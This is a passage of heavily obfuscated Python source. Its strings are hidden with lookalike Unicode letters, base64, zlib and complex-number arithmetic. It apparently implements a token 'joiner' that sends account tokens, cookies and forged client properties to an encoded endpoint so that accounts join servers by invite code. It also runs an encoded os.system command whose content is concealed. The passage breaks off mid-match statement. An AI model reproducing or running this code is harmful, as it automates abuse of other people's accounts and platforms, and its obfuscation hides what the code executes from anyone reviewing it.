__𝗶𝙢𝘱𝗼𝘳𝙩__(𝙡𝗠𝗜𝗜𝙈𝘭𝗠𝘕𝘐𝙄𝗡𝙈𝗹𝗹𝘐𝗠𝘭𝗠𝙡𝘐𝙈𝙄𝘔𝗜𝙉𝙈𝙄𝙡𝗹𝙡𝗡𝘭[𝙧𝙤𝘂𝘯𝗱(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝙤𝘳𝘵__(𝗹𝙈𝗜𝗜𝘔𝗹𝗠𝘕𝘐𝘐𝗡𝙈𝘭𝘭𝗜𝘔𝙡𝙈𝙡𝗜𝙈𝙄𝗠𝗜𝘕𝗠𝘐𝙡𝗹𝗹𝘕𝙡[𝙧𝗼𝙪𝘯𝗱(𝙖𝘣𝙨(0.37827168712631454 + 0.9256946206598651j))]).decompress(b'x\xda\x8b\xcc\xf3*K1\xf6\xcbI\xce\xb14\x8a\x8a\xf0\xaaJ\x0c\xb7,\x05\x00IC\x06\xef')).decode(): __𝙞𝙢𝙥𝘰𝘳𝘵__(𝙡𝘔𝗜𝘐𝗠𝙡𝗠𝗡𝘐𝙄𝗡𝘔𝙡𝙡𝘐𝘔𝗹𝘔𝙡𝗜𝘔𝙄𝙈𝘐𝘕𝗠𝗜𝗹𝘭𝙡𝗡𝙡[𝙧𝙤𝘂𝙣𝘥(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝘮𝗽𝘰𝘳𝘁__(𝗹𝙈𝗜𝙄𝙈𝙡𝙈𝙉𝘐𝙄𝙉𝙈𝘭𝘭𝗜𝘔𝗹𝘔𝗹𝘐𝗠𝙄𝘔𝗜𝙉𝙈𝗜𝘭𝗹𝗹𝙉𝗹[𝙧𝗼𝘶𝙣𝘥(𝙖𝗯𝘀(0.8292448943065903 + 0.5588854133598871j))]).decompress(b'x\xda\xf3\xcd\xf2,\xf5\xad4\xa9\xf0M\xb7\xb5\x05\x00\x1b\x94\x04\x16')).decode(), __𝙞𝙢𝘱𝘰𝙧𝘵__(𝘭𝗠𝙄𝘐𝗠𝙡𝗠𝙉𝘐𝙄𝘕𝙈𝙡𝙡𝘐𝘔𝙡𝗠𝗹𝘐𝗠𝗜𝙈𝙄𝙉𝘔𝙄𝗹𝘭𝗹𝘕𝘭[𝙧𝘰𝙪𝙣𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝙩__(𝗹𝘔𝙄𝙄𝙈𝘭𝘔𝘕𝘐𝗜𝗡𝘔𝙡𝗹𝘐𝗠𝗹𝙈𝙡𝗜𝘔𝗜𝘔𝙄𝘕𝙈𝘐𝗹𝘭𝘭𝘕𝘭[𝙧𝗼𝙪𝙣𝙙(𝙖𝘣𝙨(0.10683831834915336 + 0.9942764071083678j))]).decompress(b'x\xda\x8b4\xaa(\x88\n75\x880\xf22L\x0c\xaf\xc8\x8e025L\n\xf7\xcaIN\xb7\xb5\x05\x00\x80\x02\x08\xcd')).decode(): 𝙧𝘰𝙪𝘯𝙙(𝘢𝘣𝙨(203536.80475006986 + 100381.01537707189j)), __𝙞𝘮𝙥𝗼𝘳𝙩__(𝗹𝙈𝙄𝘐𝗠𝙡𝙈𝙉𝙄𝘐𝘕𝘔𝗹𝙡𝙄𝗠𝘭𝗠𝙡𝙄𝘔𝙄𝘔𝘐𝘕𝙈𝘐𝙡𝘭𝗹𝘕𝗹[𝗿𝗼𝙪𝙣𝗱(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝗿𝘁__(𝙡𝘔𝙄𝘐𝙈𝙡𝘔𝗡𝗜𝗜𝙉𝙈𝙡𝘭𝘐𝗠𝘭𝘔𝗹𝘐𝗠𝙄𝘔𝗜𝘕𝙈𝙄𝘭𝗹𝘭𝙉𝘭[𝘳𝘰𝘶𝙣𝘥(𝘢𝙗𝘴(0.4361544341348731 + 0.8998718295315665j))]).decompress(b'x\xdaK\xcau3H\x8c\x88\xca\x890\xf22L\x0c\xaf\xc8\x8e025L\n\xf7\xcaIN\xb7\xb5\x05\x00\x84\xbc\t\x08')).decode(): 𝗿𝗼𝙪𝘯𝗱(𝗮𝗯𝘴(13769.310834819284 + 34328.475761882124j)), __𝗶𝗺𝙥𝘰𝘳𝘵__(𝗹𝙈𝗜𝗜𝙈𝙡𝘔𝗡𝘐𝘐𝘕𝘔𝗹𝘭𝘐𝗠𝗹𝙈𝘭𝘐𝘔𝗜𝙈𝘐𝙉𝙈𝘐𝙡𝙡𝘭𝗡𝗹[𝙧𝗼𝘶𝙣𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝘰𝙧𝘵__(𝗹𝙈𝙄𝗜𝘔𝘭𝗠𝘕𝗜𝘐𝙉𝗠𝘭𝙡𝗜𝗠𝗹𝙈𝙡𝗜𝗠𝙄𝗠𝘐𝘕𝙈𝘐𝙡𝙡𝘭𝙉𝙡[𝗿𝘰𝘶𝙣𝘥(𝗮𝗯𝘀(0.8825879186003311 + 0.47014738746560664j))]).decompress(b'x\xda\x8b4\xaa(\x88\n75\x880\n3\x02\xd3\xc6~e)\x11^YQ\x81\xb6\xb6\x00|\xeb\x08\x96')).decode(): None}
        𝙥𝘳𝙤𝗽𝗲𝗿𝘁𝗶𝗲𝘀 = 𝙗𝙖𝘀𝘦64.b64encode(𝘫𝙨𝗼𝗻.dumps(𝘱𝗮𝙮𝙡𝗼𝗮𝗱).encode()).decode()
        return 𝗽𝙧𝙤𝙥𝙚𝗿𝘁𝘪𝙚𝘴

    def heders(self, token):
        return {__𝗶𝙢𝙥𝙤𝘳𝘵__(𝙡𝘔𝘐𝙄𝗠𝙡𝘔𝗡𝘐𝗜𝗡𝘔𝙡𝘭𝘐𝗠𝙡𝙈𝙡𝗜𝙈𝙄𝙈𝗜𝙉𝙈𝗜𝙡𝙡𝘭𝘕𝗹[𝙧𝗼𝘶𝙣𝙙(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝗼𝙧𝘵__(𝘭𝗠𝙄𝗜𝗠𝗹𝗠𝘕𝙄𝘐𝘕𝘔𝘭𝗹𝘐𝙈𝙡𝘔𝙡𝘐𝘔𝗜𝗠𝙄𝗡𝙈𝙄𝙡𝙡𝗹𝘕𝘭[𝘳𝘰𝘂𝗻𝘥(𝗮𝗯𝘴(0.5164885240318929 + 0.8562941110058837j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xacL\x8c\x082\x05\x00\x19\x1d\x03\xd2')).decode(): __𝗶𝗺𝘱𝗼𝘳𝙩__(𝙡𝗠𝙄𝙄𝘔𝘭𝗠𝗡𝘐𝙄𝘕𝘔𝙡𝗹𝘐𝗠𝗹𝙈𝗹𝙄𝗠𝙄𝘔𝙄𝘕𝘔𝘐𝗹𝗹𝗹𝗡𝘭[𝗿𝙤𝙪𝘯𝙙(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝙧𝘁__(𝗹𝘔𝘐𝘐𝗠𝙡𝙈𝙉𝗜𝙄𝙉𝗠𝗹𝘭𝙄𝙈𝘭𝘔𝗹𝗜𝙈𝗜𝘔𝗜𝗡𝗠𝗜𝙡𝘭𝗹𝙉𝙡[𝘳𝙤𝘶𝘯𝗱(𝗮𝙗𝘀(0.8987284999239975 + 0.43850551128162707j))]).decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr6\xcdJ22\xb0\x05\x00-p\x05\x02')).decode(), __𝘪𝙢𝙥𝗼𝗿𝘵__(𝙡𝗠𝙄𝗜𝗠𝙡𝘔𝗡𝘐𝘐𝘕𝗠𝗹𝗹𝗜𝗠𝗹𝗠𝙡𝙄𝗠𝗜𝘔𝙄𝙉𝗠𝙄𝗹𝗹𝙡𝘕𝗹[𝗿𝗼𝙪𝙣𝗱(𝘢𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝙤𝗿𝙩__(𝗹𝘔𝘐𝙄𝙈𝘭𝗠𝙉𝙄𝘐𝗡𝘔𝗹𝙡𝙄𝙈𝘭𝘔𝘭𝘐𝙈𝙄𝘔𝗜𝗡𝗠𝗜𝘭𝗹𝘭𝘕𝗹[𝗿𝘰𝙪𝗻𝙙(𝘢𝙗𝘀(0.32105328604658057 + 0.947061131880457j))]).decompress(b'x\xda\x8b\x0c\xf7\xcb\x8a\x8ap2\x00\x00\x0c;\x02\x8d')).decode(): __𝘪𝙢𝗽𝗼𝙧𝘁__(𝘭𝗠𝙄𝘐𝘔𝗹𝙈𝗡𝗜𝗜𝘕𝗠𝗹𝘭𝘐𝗠𝙡𝙈𝗹𝙄𝗠𝗜𝙈𝙄𝗡𝙈𝗜𝗹𝗹𝘭𝙉𝙡[𝙧𝘰𝘶𝘯𝘥(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝗿𝘁__(𝘭𝗠𝗜𝘐𝗠𝗹𝗠𝗡𝙄𝘐𝗡𝙈𝗹𝘭𝗜𝗠𝗹𝙈𝘭𝘐𝘔𝗜𝗠𝗜𝘕𝙈𝘐𝗹𝗹𝙡𝙉𝗹[𝙧𝘰𝙪𝘯𝘥(𝙖𝘣𝙨(0.32008000941650094 + 0.9473905148205426j))]).decompress(b'x\xda\xf3\xce\xb4(\x04\x00\x03L\x01^')).decode(), __𝘪𝗺𝗽𝗼𝙧𝙩__(𝙡𝗠𝙄𝙄𝗠𝘭𝘔𝙉𝙄𝙄𝙉𝙈𝗹𝗹𝘐𝘔𝗹𝙈𝙡𝗜𝗠𝘐𝙈𝙄𝘕𝗠𝗜𝗹𝗹𝗹𝘕𝗹[𝗿𝗼𝘶𝙣𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝗿𝘵__(𝗹𝙈𝘐𝙄𝘔𝘭𝗠𝗡𝙄𝘐𝘕𝗠𝘭𝙡𝗜𝙈𝗹𝗠𝘭𝗜𝙈𝗜𝗠𝙄𝗡𝘔𝙄𝗹𝘭𝗹𝗡𝙡[𝗿𝘰𝙪𝙣𝗱(𝘢𝘣𝙨(0.7313573754306216 + 0.6819944203607774j))]).decompress(b'x\xda\x8b\x0c\xf7\xcb\x8a\x8ap2\xf0\t\xaf\xc8H\xcaM1\x8c\x0cO\xc9\x01\x00Gq\x06\xf4')).decode(): __𝙞𝘮𝗽𝘰𝘳𝙩__(𝘭𝙈𝘐𝘐𝙈𝗹𝗠𝙉𝗜𝘐𝙉𝘔𝗹𝗹𝗜𝗠𝙡𝘔𝘭𝘐𝙈𝙄𝗠𝘐𝘕𝗠𝙄𝘭𝙡𝘭𝙉𝘭[𝙧𝘰𝙪𝘯𝘥(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝙧𝘵__(𝙡𝙈𝘐𝗜𝘔𝗹𝗠𝙉𝙄𝙄𝘕𝗠𝘭𝘭𝙄𝘔𝗹𝘔𝘭𝘐𝗠𝗜𝙈𝗜𝗡𝗠𝗜𝗹𝙡𝙡𝘕𝗹[𝙧𝙤𝘶𝗻𝗱(𝘢𝙗𝘴(0.31739988262223584 + 0.9482917876431235j))]).decompress(b'x\xda\x8b\n7\xb1\x05\x00\x03\x16\x01#')).decode(), __𝘪𝗺𝘱𝙤𝙧𝘁__(𝙡𝗠𝘐𝘐𝘔𝙡𝗠𝙉𝘐𝙄𝙉𝙈𝗹𝙡𝙄𝙈𝘭𝙈𝗹𝗜𝙈𝗜𝘔𝗜𝘕𝙈𝘐𝗹𝙡𝗹𝗡𝘭[𝘳𝘰𝘂𝘯𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝗿𝘵__(𝘭𝘔𝗜𝘐𝙈𝘭𝘔𝙉𝗜𝘐𝘕𝘔𝗹𝙡𝙄𝘔𝗹𝙈𝗹𝙄𝗠𝗜𝙈𝗜𝙉𝘔𝙄𝙡𝗹𝗹𝘕𝘭[𝙧𝙤𝙪𝘯𝗱(𝗮𝙗𝘴(0.8163778451744439 + 0.577518150284761j))]).decompress(b'x\xda\x8b\x8c\x083Ht\xb7\xacL\x8c(\xc8Hq\xcf)KJ\xb7\xb5\x05\x00G\xff\x06\xf3')).decode(): 𝘵𝘰𝘬𝙚𝗻, __𝘪𝙢𝙥𝙤𝘳𝘁__(𝘭𝘔𝗜𝗜𝗠𝙡𝗠𝘕𝘐𝗜𝗡𝙈𝙡𝗹𝘐𝙈𝙡𝙈𝘭𝗜𝘔𝗜𝙈𝙄𝘕𝗠𝙄𝗹𝘭𝘭𝙉𝘭[𝙧𝗼𝘶𝙣𝙙(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝘰𝗿𝘁__(𝙡𝘔𝗜𝘐𝙈𝘭𝗠𝙉𝘐𝙄𝘕𝘔𝗹𝙡𝙄𝘔𝙡𝗠𝗹𝙄𝘔𝘐𝗠𝗜𝘕𝗠𝙄𝗹𝗹𝗹𝗡𝙡[𝘳𝗼𝘂𝙣𝙙(𝙖𝙗𝘀(0.6716777537871078 + 0.7408434349223224j))]).decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x01\x00\x0b0\x02\xa6')).decode(): 𝘀𝙚𝙡𝗳.cookies, __𝗶𝗺𝘱𝘰𝘳𝘁__(𝗹𝘔𝘐𝙄𝙈𝙡𝗠𝗡𝘐𝗜𝙉𝗠𝙡𝗹𝘐𝗠𝙡𝗠𝘭𝗜𝘔𝘐𝘔𝗜𝗡𝘔𝘐𝙡𝘭𝘭𝙉𝙡[𝙧𝗼𝘂𝙣𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝙧𝘵__(𝗹𝘔𝘐𝗜𝙈𝙡𝙈𝗡𝘐𝙄𝗡𝗠𝗹𝙡𝗜𝘔𝗹𝘔𝘭𝘐𝗠𝗜𝘔𝙄𝗡𝗠𝘐𝗹𝘭𝙡𝙉𝘭[𝘳𝙤𝘶𝗻𝙙(𝗮𝘣𝙨(0.8651292088685217 + 0.5015490523991902j))]).decompress(b'x\xda\x8b4\xb2,Mq\x0f+Mq64H\x8dp\xca\x01\x00+j\x05#')).decode(): __𝙞𝙢𝙥𝘰𝙧𝘵__(𝗹𝙈𝙄𝗜𝗠𝘭𝗠𝘕𝙄𝗜𝙉𝘔𝙡𝗹𝙄𝘔𝘭𝙈𝗹𝘐𝙈𝘐𝗠𝗜𝙉𝘔𝗜𝘭𝗹𝙡𝗡𝗹[𝗿𝙤𝘂𝘯𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝘰𝙧𝘁__(𝙡𝙈𝘐𝗜𝗠𝘭𝘔𝙉𝗜𝙄𝘕𝗠𝘭𝘭𝙄𝙈𝘭𝘔𝙡𝘐𝘔𝘐𝗠𝗜𝙉𝗠𝙄𝗹𝗹𝙡𝙉𝙡[𝘳𝗼𝘶𝙣𝗱(𝗮𝘣𝘀(0.02660091869032455 + 0.9996461329514713j))]).decompress(b'x\xda\x8b\x8cp*Or\xcf\xc9\x8a\x8c\x08*H22)K\xcc\xf3+KJ\xb7\xb5\x05\x00j\xc6\x08q')).decode(), __𝙞𝗺𝗽𝙤𝙧𝘵__(𝗹𝙈𝙄𝘐𝘔𝗹𝘔𝙉𝘐𝘐𝗡𝘔𝗹𝗹𝘐𝗠𝘭𝗠𝗹𝙄𝘔𝘐𝘔𝘐𝗡𝙈𝘐𝘭𝙡𝘭𝘕𝙡[𝗿𝙤𝘶𝙣𝘥(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝘳𝘵__(𝘭𝘔𝙄𝙄𝗠𝗹𝗠𝙉𝙄𝘐𝗡𝙈𝘭𝙡𝗜𝘔𝗹𝗠𝗹𝙄𝙈𝘐𝙈𝘐𝘕𝙈𝗜𝘭𝗹𝘭𝙉𝗹[𝘳𝘰𝘶𝗻𝘥(𝗮𝙗𝘀(0.564982213227731 + 0.8251030837030575j))]).decompress(b'x\xdaK\x89\xf0\xcbI\xce4\xcc\x882\n+Mq\xb4\xb5\x05\x00/v\x05R')).decode(): __𝘪𝙢𝘱𝙤𝗿𝙩__(𝙡𝗠𝗜𝗜𝗠𝙡𝘔𝗡𝘐𝗜𝘕𝙈𝘭𝘭𝙄𝙈𝗹𝙈𝘭𝗜𝗠𝙄𝗠𝘐𝘕𝘔𝘐𝗹𝙡𝘭𝘕𝘭[𝙧𝗼𝘂𝙣𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝙧𝙩__(𝗹𝘔𝙄𝙄𝙈𝘭𝘔𝘕𝙄𝘐𝘕𝙈𝙡𝗹𝙄𝙈𝙡𝙈𝙡𝗜𝘔𝗜𝗠𝙄𝘕𝙈𝗜𝙡𝘭𝗹𝘕𝙡[𝘳𝗼𝘂𝘯𝘥(𝙖𝙗𝘴(0.5395134305671078 + 0.841976993888616j))]).decompress(b'x\xda=\xcdA\x0f\x82 \x18\x80\xe1\xbf\xa4_\xad\xe9\xc1\x83+u\x14\xd0T@\xeb\xa6\xb8\xa1\xa4\x8b\xcd)\xca\xaf\xaf.]\xdf\xc3\xf3\xb2*<5\xd56?\xca\xc0\xc7:V\xb7\xb43\xedT\xac\xdd\x81(6\xe6\x8a\xb0x!\x97Y\t/\xac\xa9\xce\rJR+\xb3m\x14 \x86\x12F\x0f;\xee\xe8~tt\x88\xdf\xa5\xd7s\xc6\xed\x8c\xb2\xcd4\xc0U\x01B7\x10\x18\x94\x15F\x02]\xe5\x94\xaf\xa4<Z\xac_\x960\xa9r\xe8\xf7\x16\xfc\x11\xbb\xc4\xde\xcf\xbf\xfe\xb5\xd8k!:\xf1Q"\xe6gE=9\x85\x0bvh\xc7\x9a,\x84!\xc5!\x9d\x1e\xf5\xd5\xfc\xbf*\x8a>\xc9\x89CX')).decode(), __𝗶𝙢𝗽𝗼𝙧𝙩__(𝗹𝘔𝗜𝙄𝗠𝘭𝙈𝗡𝙄𝗜𝙉𝗠𝙡𝙡𝘐𝙈𝙡𝙈𝗹𝘐𝗠𝗜𝘔𝘐𝘕𝘔𝘐𝗹𝗹𝙡𝙉𝙡[𝙧𝙤𝘂𝗻𝗱(𝘢𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝗿𝙩__(𝙡𝘔𝗜𝙄𝙈𝘭𝙈𝙉𝗜𝗜𝙉𝙈𝙡𝘭𝘐𝗠𝗹𝘔𝘭𝘐𝙈𝗜𝗠𝙄𝗡𝗠𝗜𝘭𝘭𝘭𝙉𝘭[𝘳𝘰𝙪𝗻𝘥(𝘢𝙗𝙨(0.6110557850697401 + 0.7915875362414466j))]).decompress(b'x\xdaKu6\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\t\xaf(\x8b4r+\x8e\n\xb4\xb5\x05\x00e\n\x07\xfa')).decode(): __𝘪𝗺𝘱𝙤𝙧𝙩__(𝘭𝘔𝗜𝘐𝗠𝙡𝗠𝘕𝙄𝘐𝙉𝗠𝘭𝘭𝙄𝘔𝗹𝘔𝗹𝙄𝗠𝙄𝙈𝗜𝗡𝙈𝗜𝘭𝗹𝘭𝘕𝙡[𝙧𝗼𝙪𝙣𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝗼𝙧𝘵__(𝘭𝗠𝗜𝗜𝘔𝙡𝗠𝘕𝙄𝙄𝘕𝙈𝙡𝙡𝗜𝘔𝘭𝗠𝘭𝙄𝙈𝙄𝗠𝘐𝗡𝗠𝙄𝗹𝗹𝙡𝗡𝗹[𝙧𝘰𝘂𝘯𝗱(𝙖𝙗𝘴(0.5191767204721445 + 0.8546669134345782j))]).decompress(b'x\xda\x8b\n7)\t\x0b\xf3\xb5\x05\x00\x0b\xe6\x02\x90')).decode(), __𝙞𝙢𝙥𝗼𝘳𝘵__(𝘭𝘔𝙄𝗜𝙈𝙡𝙈𝙉𝘐𝗜𝘕𝗠𝗹𝘭𝙄𝘔𝙡𝘔𝗹𝙄𝘔𝘐𝙈𝘐𝙉𝙈𝙄𝗹𝘭𝘭𝙉𝘭[𝘳𝙤𝙪𝘯𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝘳𝘵__(𝙡𝘔𝘐𝘐𝗠𝙡𝙈𝗡𝗜𝙄𝘕𝗠𝘭𝘭𝗜𝘔𝙡𝗠𝗹𝗜𝗠𝗜𝘔𝙄𝗡𝙈𝙄𝘭𝗹𝙡𝘕𝘭[𝗿𝗼𝙪𝙣𝗱(𝗮𝘣𝘴(0.02064801331745525 + 0.9997868070474035j))]).decompress(b'x\xdaKu6\xacJ\x89p\xcaI\xce4,O\xce\xb5,\x8f\x8a\xf02H\x0c\x0f\xab\x02\x00hT\x08f')).decode(): 𝙨𝙚𝙡𝘧.props}

    def joiner(self, token, invite):
        𝗼𝘴.system(__𝘪𝗺𝗽𝗼𝗿𝙩__(𝘭𝗠𝙄𝗜𝙈𝗹𝘔𝗡𝘐𝙄𝗡𝗠𝙡𝙡𝙄𝘔𝘭𝘔𝙡𝘐𝘔𝗜𝘔𝗜𝗡𝙈𝗜𝗹𝗹𝘭𝙉𝙡[𝗿𝙤𝘶𝘯𝘥(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__(𝗹𝘔𝗜𝗜𝘔𝙡𝙈𝘕𝗜𝗜𝙉𝙈𝘭𝘭𝘐𝗠𝘭𝗠𝗹𝘐𝘔𝙄𝙈𝙄𝘕𝙈𝗜𝘭𝗹𝘭𝘕𝙡[𝙧𝙤𝘂𝙣𝗱(𝘢𝙗𝘀(0.2634333815143701 + 0.9646775904435141j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x0f\xce\xb5,H\xca\r\xab\x04\x00\x89\x9c\t\xbd')).decode())
        try:
            𝗽𝘢𝘺𝘭𝗼𝙖𝗱 = {__𝗶𝗺𝗽𝗼𝘳𝘁__(𝙡𝘔𝘐𝘐𝙈𝗹𝙈𝗡𝘐𝗜𝗡𝙈𝗹𝙡𝗜𝙈𝗹𝙈𝗹𝘐𝘔𝘐𝗠𝙄𝘕𝘔𝘐𝙡𝙡𝗹𝘕𝙡[𝙧𝗼𝙪𝘯𝘥(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝘳𝙩__(𝙡𝗠𝙄𝙄𝘔𝗹𝗠𝘕𝙄𝗜𝙉𝘔𝗹𝘭𝗜𝘔𝘭𝗠𝗹𝗜𝙈𝙄𝙈𝘐𝘕𝙈𝘐𝙡𝗹𝙡𝙉𝘭[𝙧𝙤𝘂𝘯𝙙(𝙖𝙗𝙨(0.9648842404983641 + 0.2626754698061757j))]).decompress(b'x\xdaK6\n\xabJ6\xca)K\xca\xb1,\x88r\xb4\xb5\x05\x00/\xa8\x05i')).decode(): 𝙪𝘶𝗶𝗱.uuid4().hex}
            𝙧𝗲𝙨𝗽𝘰𝙣𝘀𝘦 = 𝘀𝗲𝘀𝘀𝘪𝘰𝘯.post(__𝗶𝙢𝘱𝘰𝗿𝙩__(𝘭𝘔𝗜𝙄𝗠𝙡𝘔𝗡𝗜𝘐𝗡𝙈𝘭𝘭𝗜𝙈𝙡𝗠𝗹𝗜𝙈𝙄𝘔𝘐𝙉𝘔𝗜𝗹𝘭𝙡𝗡𝗹[𝗿𝘰𝘶𝘯𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝗿𝘁__(𝙡𝙈𝘐𝘐𝙈𝘭𝙈𝗡𝗜𝙄𝗡𝘔𝙡𝙡𝙄𝗠𝗹𝙈𝗹𝙄𝗠𝗜𝙈𝘐𝘕𝙈𝘐𝘭𝙡𝗹𝗡𝙡[𝘳𝙤𝘂𝙣𝘥(𝙖𝙗𝘀(0.5540216854828446 + 0.8325022354412919j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb6\xccHv\xcf.K\xc9\xca.K\x0c75J\x8c\x08\xcaI\xae\xb44O\x0b\xb4\xb5\x05\x00\xd0\x87\x11\x9e')).decode().format(𝗶𝗻𝙫𝘪𝙩𝘦), headers=𝘀𝙚𝘭𝙛.heders(𝙩𝙤𝘬𝗲𝙣), json=𝘱𝗮𝘆𝙡𝘰𝗮𝘥)
            match 𝗿𝘦𝘀𝘱𝙤𝙣𝘀𝙚.status_code:
                case 𝗿𝘰𝘂𝗻𝘥(𝗮𝙗𝙨(178.6317806722746 + 89.94824586312055j)):
                    𝗽𝙧𝙞𝙣𝙩(__𝙞𝘮𝗽𝘰𝘳𝘁__(𝘭𝘔𝙄𝘐𝗠𝗹𝗠𝗡𝘐𝗜𝘕𝘔𝙡𝙡𝙄𝗠𝘭𝘔𝘭𝘐𝘔𝘐𝙈𝗜𝗡𝙈𝙄𝗹𝙡𝙡𝙉𝙡[𝗿𝗼𝘂𝙣𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__(𝘭𝙈𝗜𝘐𝗠𝙡𝘔𝘕𝘐𝙄𝗡𝙈𝗹𝗹𝙄𝘔𝗹𝗠𝘭𝘐𝘔𝗜𝘔𝗜𝘕𝗠𝙄𝙡𝘭𝗹𝙉𝙡[𝙧𝗼𝘂𝙣𝗱(𝘢𝗯𝘀(0.5337632821093911 + 0.8456339389309128j))]).decompress(b'x\xda\x0b7.\xb1\x0c\xce\xb6\xf4\n\xc9\x0esM56L\xf1\xcft2O\x0bv\xcc\xf7\xc9M\xc9\xf3\x01\xcay\x07\xda\xda\x02\x00\xd4\r\x0bg')).decode().format(𝙡𝘤, 𝗿, 𝘵𝘰𝗸𝘦𝙣[:𝘳𝙤𝙪𝙣𝗱(𝙖𝘣𝘀(20.462247875392183 + 14.363022379917398j))], 𝙞𝘯𝙫𝙞𝘵𝘦))
                case 𝗿𝗼𝙪𝘯𝘥(𝘢𝘣𝘴(39.038748872096065 + 398.09041194997576j)):
                    𝙥𝙧𝘪𝗻𝘁(__𝙞𝙢𝗽𝗼𝘳𝙩__(𝘭𝘔𝘐𝙄𝘔𝙡𝘔𝙉𝙄𝙄𝘕𝙈𝗹𝙡𝗜𝘔𝙡𝙈𝗹𝙄𝙈𝙄𝙈𝗜𝘕𝗠𝘐𝗹𝘭𝗹𝙉𝙡[𝙧𝘰𝙪𝗻𝘥(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝙤𝘳𝘁__(𝘭𝗠𝙄𝗜𝙈𝙡𝘔𝙉𝘐𝗜𝗡𝘔𝙡𝙡𝘐𝘔𝙡𝘔𝗹𝗜𝙈𝗜𝘔𝗜𝗡𝘔𝗜𝗹𝙡𝘭𝗡𝙡[𝘳𝘰𝙪𝗻𝗱(𝗮𝙗𝙨(0.15390616433816096 + 0.9880854682560183j))]).decompress(b'x\xda\x0b7.\xb1\x0c4p\x0b\x0cs\xf5\xf3\x0c\x8c(\xb1\x8c\x08\xc9OO56H\xf7v6\xcd\x8b\xaa\xb44O\x0b\xce\xb6\x05\x00\xce\xb6\x0b^')).decode().format(𝗹𝙘, 𝙧, 𝘁𝙤𝙠𝙚𝙣[:𝘳𝘰𝘂𝘯𝙙(𝙖𝘣𝘀(2.7485297931081925 + 24.84845234569744j))], 𝘪𝘯𝘃𝘪𝙩𝗲))
                case 𝗿𝗼𝘂𝗻𝗱(𝙖𝗯𝘀(384.86323537521014 + 189.5291271982373j)):
                    𝗽𝙧𝗶𝙣𝘵(__𝗶𝙢𝘱𝘰𝗿𝘵__(𝘭𝙈𝗜𝗜𝘔𝗹𝙈𝙉𝙄𝘐𝗡𝙈𝗹𝙡𝘐𝗠𝘭𝘔𝙡𝗜𝘔𝘐𝘔𝙄𝗡𝘔𝘐𝗹𝗹𝗹𝙉𝗹[𝙧𝘰𝘂𝙣𝘥(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝘱𝗼𝗿𝘵__(𝙡𝘔𝘐𝗜𝙈𝘭𝘔𝘕𝘐𝘐𝙉𝘔𝙡𝘭𝘐𝘔𝗹𝗠𝙡𝗜𝗠𝙄𝘔𝗜𝙉𝙈𝘐𝘭𝙡𝗹𝙉𝗹[𝙧𝙤𝘂𝘯𝗱(𝘢𝗯𝘴(0.6449279948259272 + 0.7642433391857654j))]).decompress(b'x\xda\x0b7.\xb1\x0c\xcdv\x0b\r\n\xad\xf0\n\t\xcd\x01\xd2A\xe6ia\x06f\x9e\x1e%\x96\x9e\xce\xe9\xa5QF\xc9e\xa9\xc6\x06\x05\x00\n\xba\x0c\xfb')).decode().format(𝘭𝗰, 𝗿, 𝙩𝘰𝙠𝙚𝙣[:𝙧𝙤𝘶𝘯𝗱(𝗮𝘣𝘴(17.777262674260093 + 17.577512105254225j))], 𝘪𝗻𝘷𝘪𝘵𝘦))
                case _:
